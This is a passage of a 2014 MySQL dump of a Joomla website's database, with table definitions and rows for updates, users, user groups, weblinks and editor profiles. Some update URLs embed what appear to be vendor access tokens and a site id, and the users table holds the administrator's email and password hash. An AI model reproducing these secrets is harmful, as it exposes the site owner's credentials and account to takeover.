Cyrillic','','pkg_sr-RS','package','',0,'3.2.3.2','','http://update.joomla.org/language/details3/sr-RS_details.xml','',''),(46,3,0,'Vietnamese','','pkg_vi-VN','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/vi-VN_details.xml','',''),(47,3,0,'Bahasa Indonesia','','pkg_id-ID','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/id-ID_details.xml','',''),(48,3,0,'Finnish','','pkg_fi-FI','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/fi-FI_details.xml','',''),(49,3,0,'Swahili','','pkg_sw-KE','package','',0,'3.2.3.1','','http://update.joomla.org/language/details3/sw-KE_details.xml','',''),(50,3,0,'Montenegrin','','pkg_srp-ME','package','',0,'3.2.1.1','','http://update.joomla.org/language/details3/srp-ME_details.xml','',''),(51,5,0,'RokGallery Extension','','com_rokgallery','component','',0,'2.29','0802','http://updates.rockettheme.com/joomla/286/21ffe006?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(52,5,0,'RokWeather Module','','mod_rokweather','module','',0,'2.0.3','0802','http://updates.rockettheme.com/joomla/292/a0cbba72?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(53,5,0,'RokStock Module','','mod_rokstock','module','',0,'2.0.1','0802','http://updates.rockettheme.com/joomla/295/87c1121c?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(54,5,0,'RokMiniEvents3 Module','','mod_rokminievents','module','',0,'3.0.0','0802','http://updates.rockettheme.com/joomla/297/1686051690?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(55,5,0,'RokQuickCart Extension','','com_rokquickcart','component','',0,'2.1.2','0802','http://updates.rockettheme.com/joomla/298/ddfa10eb?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(56,5,0,'RokCandy Extension','','com_rokcandy','component','',0,'2.0.1','0802','http://updates.rockettheme.com/joomla/302/2df8a4e2?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(57,5,0,'RokBridge Extension','','com_rokbridge','component','',0,'3.2','0802','http://updates.rockettheme.com/joomla/304/535b5e07?access_token=583a39c62c391c33bb9dfc8532c377586ef0a0e8&site_id=f469954c4689d08a1a26cefd2e6d589a','',''),(58,22,0,'Kunena Language Pack','Language Pack for Kunena Forum','pkg_kunena_languages','package','',0,'3.0.5','','http://update.kunena.org/3.0/pkg_kunena_languages.xml','',''),(59,22,0,'Kunena Login Module','','mod_kunenalogin','module','',0,'3.0.1','','http://update.kunena.org/3.0/mod_kunenalogin.xml','','');
/*!40000 ALTER TABLE `hfa_updates` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_user_keys`
--

DROP TABLE IF EXISTS `hfa_user_keys`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_user_keys` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `series` varchar(255) NOT NULL,
  `invalid` tinyint(4) NOT NULL,
  `time` varchar(200) NOT NULL,
  `uastring` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `series` (`series`),
  UNIQUE KEY `series_2` (`series`),
  UNIQUE KEY `series_3` (`series`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_user_keys`
--

LOCK TABLES `hfa_user_keys` WRITE;
/*!40000 ALTER TABLE `hfa_user_keys` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_user_keys` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_user_notes`
--

DROP TABLE IF EXISTS `hfa_user_notes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_user_notes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(100) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL,
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `review_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_category_id` (`catid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_user_notes`
--

LOCK TABLES `hfa_user_notes` WRITE;
/*!40000 ALTER TABLE `hfa_user_notes` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_user_notes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_user_profiles`
--

DROP TABLE IF EXISTS `hfa_user_profiles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_user_profiles` (
  `user_id` int(11) NOT NULL,
  `profile_key` varchar(100) NOT NULL,
  `profile_value` varchar(255) NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `idx_user_id_profile_key` (`user_id`,`profile_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Simple user profile storage table';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_user_profiles`
--

LOCK TABLES `hfa_user_profiles` WRITE;
/*!40000 ALTER TABLE `hfa_user_profiles` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_user_profiles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_user_usergroup_map`
--

DROP TABLE IF EXISTS `hfa_user_usergroup_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_user_usergroup_map` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__users.id',
  `group_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__usergroups.id',
  PRIMARY KEY (`user_id`,`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_user_usergroup_map`
--

LOCK TABLES `hfa_user_usergroup_map` WRITE;
/*!40000 ALTER TABLE `hfa_user_usergroup_map` DISABLE KEYS */;
INSERT INTO `hfa_user_usergroup_map` VALUES (254,8);
/*!40000 ALTER TABLE `hfa_user_usergroup_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_usergroups`
--

DROP TABLE IF EXISTS `hfa_usergroups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_usergroups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Adjacency List Reference Id',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `title` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_usergroup_parent_title_lookup` (`parent_id`,`title`),
  KEY `idx_usergroup_title_lookup` (`title`),
  KEY `idx_usergroup_adjacency_lookup` (`parent_id`),
  KEY `idx_usergroup_nested_set_lookup` (`lft`,`rgt`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_usergroups`
--

LOCK TABLES `hfa_usergroups` WRITE;
/*!40000 ALTER TABLE `hfa_usergroups` DISABLE KEYS */;
INSERT INTO `hfa_usergroups` VALUES (1,0,1,18,'Public'),(2,1,8,15,'Registered'),(3,2,9,14,'Author'),(4,3,10,13,'Editor'),(5,4,11,12,'Publisher'),(6,1,4,7,'Manager'),(7,6,5,6,'Administrator'),(8,1,16,17,'Super Users'),(9,1,2,3,'Guest');
/*!40000 ALTER TABLE `hfa_usergroups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_users`
--

DROP TABLE IF EXISTS `hfa_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `username` varchar(150) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `password` varchar(100) NOT NULL DEFAULT '',
  `block` tinyint(4) NOT NULL DEFAULT '0',
  `sendEmail` tinyint(4) DEFAULT '0',
  `registerDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lastvisitDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `activation` varchar(100) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `lastResetTime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'Date of last password reset',
  `resetCount` int(11) NOT NULL DEFAULT '0' COMMENT 'Count of password resets since lastResetTime',
  `otpKey` varchar(1000) NOT NULL DEFAULT '' COMMENT 'Two factor authentication encrypted keys',
  `otep` varchar(1000) NOT NULL DEFAULT '' COMMENT 'One time emergency passwords',
  PRIMARY KEY (`id`),
  KEY `idx_name` (`name`),
  KEY `idx_block` (`block`),
  KEY `username` (`username`),
  KEY `email` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=328 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_users`
--

LOCK TABLES `hfa_users` WRITE;
/*!40000 ALTER TABLE `hfa_users` DISABLE KEYS */;
INSERT INTO `hfa_users` VALUES (254,'Administrator','admin','support@hackforathens.org','$P$DnnTnqCJSN0MShRn9DW93GUPUjNxs1/',0,1,'2013-04-03 19:44:01','2014-04-30 21:23:47','0','{\"editor\":\"\",\"timezone\":\"\",\"language\":\"\",\"admin_style\":\"\",\"admin_language\":\"\",\"helpsite\":\"\"}','0000-00-00 00:00:00',0,'','');
/*!40000 ALTER TABLE `hfa_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_viewlevels`
--

DROP TABLE IF EXISTS `hfa_viewlevels`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_viewlevels` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `title` varchar(100) NOT NULL DEFAULT '',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_assetgroup_title_lookup` (`title`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_viewlevels`
--

LOCK TABLES `hfa_viewlevels` WRITE;
/*!40000 ALTER TABLE `hfa_viewlevels` DISABLE KEYS */;
INSERT INTO `hfa_viewlevels` VALUES (1,'Public',0,'[1]'),(2,'Registered',1,'[6,2,8]'),(3,'Special',2,'[6,3,8]'),(6,'Guest',0,'[9]');
/*!40000 ALTER TABLE `hfa_viewlevels` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_weblinks`
--

DROP TABLE IF EXISTS `hfa_weblinks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_weblinks` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `catid` int(11) NOT NULL DEFAULT '0',
  `title` varchar(250) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `url` varchar(250) NOT NULL DEFAULT '',
  `description` text NOT NULL,
  `hits` int(11) NOT NULL DEFAULT '0',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `access` int(11) NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `language` char(7) NOT NULL DEFAULT '',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if link is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `images` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_weblinks`
--

LOCK TABLES `hfa_weblinks` WRITE;
/*!40000 ALTER TABLE `hfa_weblinks` DISABLE KEYS */;
INSERT INTO `hfa_weblinks` VALUES (1,17,'Joomla Templates','joomla-templates','http://www.rockettheme.com/joomla','',0,-2,0,'0000-00-00 00:00:00',1,1,'{\"target\":\"\",\"width\":\"\",\"height\":\"\",\"count_clicks\":\"\"}','*','2013-02-15 15:46:21',254,'','0000-00-00 00:00:00',0,'','','{\"robots\":\"\",\"rights\":\"\"}',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',1,''),(2,17,'WordPress Themes','wordpress-themes','http://www.rockettheme.com/wordpress','',0,-2,0,'0000-00-00 00:00:00',2,1,'{\"target\":\"\",\"width\":\"\",\"height\":\"\",\"count_clicks\":\"\"}','*','2013-02-15 15:46:35',254,'','0000-00-00 00:00:00',0,'','','{\"robots\":\"\",\"rights\":\"\"}',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',1,''),(3,17,'Magento Templates','magento-templates','http://www.rockettheme.com/magento','',0,-2,0,'0000-00-00 00:00:00',3,1,'{\"target\":\"\",\"width\":\"\",\"height\":\"\",\"count_clicks\":\"\"}','*','2013-02-15 15:46:44',254,'','0000-00-00 00:00:00',0,'','','{\"robots\":\"\",\"rights\":\"\"}',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',1,''),(4,17,'phpBB3 Styles','phpbb3-styles','http://www.rockettheme.com/phpbb3','',0,-2,0,'0000-00-00 00:00:00',4,1,'{\"target\":\"\",\"width\":\"\",\"height\":\"\",\"count_clicks\":\"\"}','*','2013-02-15 15:46:55',254,'','0000-00-00 00:00:00',0,'','','{\"robots\":\"\",\"rights\":\"\"}',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',1,'');
/*!40000 ALTER TABLE `hfa_weblinks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_wf_profiles`
--

DROP TABLE IF EXISTS `hfa_wf_profiles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_wf_profiles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `users` text NOT NULL,
  `types` text NOT NULL,
  `components` text NOT NULL,
  `area` tinyint(3) NOT NULL,
  `device` varchar(255) NOT NULL,
  `rows` text NOT NULL,
  `plugins` text NOT NULL,
  `published` tinyint(3) NOT NULL,
  `ordering` int(11) NOT NULL,
  `checked_out` tinyint(3) NOT NULL,
  `checked_out_time` datetime NOT NULL,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_wf_profiles`
--

LOCK TABLES `hfa_wf_profiles` WRITE;
/*!40000 ALTER TABLE `hfa_wf_profiles` DISABLE KEYS */;
INSERT INTO `hfa_wf_profiles` VALUES (1,'Default','Default Profile for all users','','3,4,5,6,8,7','',0,'desktop,tablet,phone','help,newdocument,undo,redo,spacer,bold,italic,underline,strikethrough,justifyfull,justifycenter,justifyleft,justifyright,spacer,blockquote,formatselect,styleselect,removeformat,cleanup;fontselect,fontsizeselect,forecolor,backcolor,spacer,clipboard,indent,outdent,lists,sub,sup,textcase,charmap,hr;directionality,fullscreen,preview,source,print,searchreplace,spacer,table;visualaid,visualchars,visualblocks,nonbreaking,style,xhtmlxtras,anchor,unlink,link,imgmanager,spellchecker,article','contextmenu,browser,inlinepopups,media,help,clipboard,searchreplace,directionality,fullscreen,preview,source,table,textcase,print,style,nonbreaking,visualchars,visualblocks,xhtmlxtras,imgmanager,anchor,link,spellchecker,article,lists,charmap',1,1,0,'0000-00-00 00:00:00',''),(2,'Front End','Sample Front-end Profile','','3,4,5','',1,'desktop,tablet,phone','help,newdocument,undo,redo,spacer,bold,italic,underline,strikethrough,justifyfull,justifycenter,justifyleft,justifyright,spacer,formatselect,styleselect;clipboard,searchreplace,indent,outdent,lists,cleanup,charmap,removeformat,hr,sub,sup,textcase,nonbreaking,visualchars,visualblocks;fullscreen,preview,print,visualaid,style,xhtmlxtras,anchor,unlink,link,imgmanager,spellchecker,article','contextmenu,inlinepopups,help,clipboard,searchreplace,fullscreen,preview,print,style,textcase,nonbreaking,visualchars,visualblocks,xhtmlxtras,imgmanager,anchor,link,spellchecker,article,lists,charmap',0,2,0,'0000-00-00 00:00:00',''),(3,'Blogger','Simple Blogging Profile','','3,4,5,6,8,7','',0,'desktop,tablet,phone','bold,italic,strikethrough,lists,blockquote,spacer,justifyleft,justifycenter,justifyright,spacer,link,unlink,imgmanager,article,spellchecker,fullscreen,kitchensink;formatselect,underline,justifyfull,forecolor,clipboard,removeformat,charmap,indent,outdent,undo,redo,help','link,imgmanager,article,spellchecker,fullscreen,kitchensink,clipboard,contextmenu,inlinepopups,lists,charmap',0,3,0,'0000-00-00 00:00:00','{\"editor\":{\"toggle\":\"0\"}}'),(4,'Mobile','Sample Mobile Profile','','3,4,5,6,8,7','',0,'tablet,phone','undo,redo,spacer,bold,italic,underline,formatselect,spacer,justifyleft,justifycenter,justifyfull,justifyright,spacer,fullscreen,kitchensink;styleselect,lists,spellchecker,article,link,unlink','fullscreen,kitchensink,spellchecker,article,link,inlinepopups,lists',0,4,0,'0000-00-00 00:00:00','{\"editor\":{\"toolbar_theme\":\"mobile\",\"resizing\":\"0\",\"resize_horizontal\":\"0\",\"resizing_use_cookie\":\"0\",\"toggle\":\"0\",\"links\":{\"popups\":{\"default\":\"\",\"jcemediabox\":{\"enable\":\"0\"},\"window\":{\"enable\":\"0\"}}}}}');
/*!40000 ALTER TABLE `hfa_wf_profiles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_xmap_items`
--

DROP TABLE IF EXISTS `hfa_xmap_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_xmap_items` (
  `uid` varchar(100) NOT NULL,
  `itemid` int(11) NOT NULL,
  `view` varchar(10) NOT NULL,
  `sitemap_id` int(11) NOT NULL,
  `properties` varchar(300) DEFAULT NULL,
  PRIMARY KEY (`uid`,`itemid`,`view`,`sitemap_id`),
  KEY `uid` (`uid`,`itemid`),
  KEY `view` (`view`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_xmap_items`
--

LOCK TABLES `hfa_xmap_items` WRITE;
/*!40000 ALTER TABLE `hfa_xmap_items` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_xmap_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_xmap_sitemap`
--

DROP TABLE IF EXISTS `hfa_xmap_sitemap`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_xmap_sitemap` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) DEFAULT NULL,
  `alias` varchar(255) DEFAULT NULL,
  `introtext` text,
  `metadesc` text,
  `metakey` text,
  `attribs` text,
  `selections` text,
  `excluded_items` text,
  `is_default` int(1) DEFAULT '0',
  `state` int(2) DEFAULT NULL,
  `access` int(11) DEFAULT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `count_xml` int(11) DEFAULT NULL,
  `count_html` int(11) DEFAULT NULL,
  `views_xml` int(11) DEFAULT NULL,
  `views_html` int(11) DEFAULT NULL,
  `lastvisit_xml` int(11) DEFAULT NULL,
  `lastvisit_html` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_xmap_sitemap`
--

LOCK TABLES `hfa_xmap_sitemap` WRITE;
/*!40000 ALTER TABLE `hfa_xmap_sitemap` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_xmap_sitemap` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2014-04-30 17:29:58